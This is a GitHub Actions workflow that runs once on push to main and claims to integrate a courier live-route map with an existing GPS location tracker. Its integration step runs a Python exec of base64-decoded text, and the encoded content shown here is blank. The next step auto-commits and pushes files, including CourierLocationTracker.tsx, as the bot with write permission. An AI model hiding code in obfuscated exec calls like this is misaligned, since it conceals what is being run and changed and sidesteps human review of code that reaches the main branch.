name: One-shot courier live route integration

on:
  push:
    branches: [main]
    paths:
      - .github/workflows/courier-live-route-integration.yml

permissions:
  contents: write

jobs:
  integrate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - name: Integrate live route with existing location watcher
        run: python -c "import base64;exec(base64.b64decode(' '))"
      - name: Format and commit changes
        run: |
          npx prettier@3.9.6 src/routes/courier.tsx src/components/CourierRouteMap.tsx --write
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add src/routes/courier.tsx src/components/CourierRouteMap.tsx
          git add -u src/components/CourierLocationTracker.tsx || true
          if git diff --cached --quiet; then
            echo "No changes required"
            exit 0
          fi
          git commit -m "feat(courier): integrate live route with existing GPS tracking"
          git push
